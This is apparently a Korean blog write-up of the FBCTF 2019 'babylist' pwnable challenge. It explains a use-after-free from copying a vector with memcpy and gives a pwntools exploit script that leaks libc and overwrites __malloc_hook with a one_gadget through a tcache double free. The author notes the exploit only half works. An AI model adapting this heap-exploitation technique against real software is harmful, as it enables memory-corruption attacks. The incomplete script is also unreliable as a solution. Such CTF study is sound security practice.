---
title: FBCTF 2019 - babylist
categories:
 - pwnable
tags: cpp
---

```sh
$$$$$$$$$$$$$$$$$$$$$$$$$$
Welcome to babylist!
$$$$$$$$$$$$$$$$$$$$$$$$$$

1. Create a list
2. Add element to list
3. View element in list
4. Duplicate a list
5. Remove a list
6. Exit
> 
```

- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference


## Introduction

`overfloat`문제 풀고나서 해당 ctf문제를 더 풀어보기로 했다.

## Vunlnerability

`Duplicate a list`에서 vector자체를 memcpy로 복사하기 때문에 복사된것이나 복사한것에 element를 size 넘어서 추가를 해주면 delete 후 new를 해주는데 

다른 한 개는 여전히 delete된 주소를 가리키고 있어서 취약점이 발생한다.

## Exploit



## slv.py

```python
from pwn import *

p = process('./babylist')


id = [False for i in range(10)]


context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
#context.log_level = 'debug'

script = '''

'''

sla = lambda s,c : p.sendlineafter(s, str(c))

one_gadget_offset = [0x4f365, 0x4f3c2, 0x10a45c]
__malloc_hook_offset = 0x3ebc30
__free_hook_offset = 0x3ed8e8
def Create_list(name):
    
    idx = -1
    sla('> ', 1)
    
    sla(':\n', name)
    
    for i in range(10):
        
        if id[i] == False:
            idx = i
            id[i] = True
            break
    
    if idx == -1:
        print("list is full")
        exit(0)
    
    
    return idx


def Add_element(index, number):
    
    sla('> ', 2)
    
    sla(':\n', index)
    
    sla(':\n', number)
    
    
    return


def View_element(index_list, index_elm):
    
    sla('> ', 3)
    
    sla(':\n', index_list)
    
    sla(':\n', index_elm)
    
    
    
    return p.recvuntil('\n')


def Duplicate_list(index, name):
    
    idx = -1
    
    sla('> ', 4)
    
    sla(':\n', index)
    
    sla(':\n', name)
    
    for i in range(10):
        
        if id[i] == False:
            idx = i
            id[i] = True
            break
    
    if idx == -1:
        print("list is full")
        exit(0)
    
    
    return idx


def Remove_list(index):
    
    sla('> ', 5)
    
    sla(':\n', index)
    
    id[index] = False
    
    return


def main():
    global script
    
    ########## STAGE 1 [libc leak] ###########

    
    a = Create_list('a')
    
    for i in range(400):
        Add_element(a,i);
    
    b = Duplicate_list(a, 'b')
    
    for i in range(400):
        Add_element(b,i)
    
    libc_leak = int(View_element(0,1).split(' = ')[1]) << 32
    
    libc_leak += int(View_element(0,0).split(' = ')[1]) & 0xffffffff
    
    libc_base = libc_leak - 0x3ebca0
    one_gadget_addr = libc_base + one_gadget_offset[0]
    __malloc_hook_addr = libc_base + __malloc_hook_offset
    __free_hook_addr = libc_base + __free_hook_offset
    
    log.info('libc_base : ' + hex(libc_base))
    
    
    ########## STAGE 2 [exploit] ###########
    f = Create_list('f')
    Add_element(f, __malloc_hook_addr & 0xffffffff)
    Add_element(f, __malloc_hook_addr >> 32)
    
    '''
    using double free & tcache fd 
    '''
    
    c = Create_list('c')
    
    Add_element(c, 1)
    
    d = Duplicate_list(c, 'd')
    
    Add_element(d, 1)
    
    for i in range(4):
        Add_element(c, i)
    
    
    
    log.info('__malloc_hook_addr : ' + hex(__malloc_hook_addr))
    log.info('__free_hook_addr : ' + hex(__free_hook_addr))
    log.info('one_gadget_addr : ' + hex(one_gadget_addr))
    
    Add_element(f, 0x5eadbeef)
    
    g = Create_list('g')
    Add_element(g, one_gadget_addr & 0xffffffff)
    Add_element(g, one_gadget_addr >> 32)
    
    script += 'b* ' + hex(one_gadget_addr)
    gdb.attach(p,script)
    
    h = Create_list('h')
    Add_element(h, 0x5eadbeef)
    
    i = Duplicate_list(g, 'i')
    Add_element(i , 0x5eadbeef)
    
    
    #sla('> ', 1)
    #Add_element(h,2)
    
    
    p.interactive()
    
    
    
    return



if __name__ == '__main__':
    main()
    
```

libc_leak은 성공..(20.08.31)
exploit 절반 성공... rsp를 0x10으로 aligned 시켜줘야됨 ~~개빡치네 진짜로~~(20.09.1)
one_gadget의 조건을 맞추지 못하고 있음..

## 느낀 점


## Reference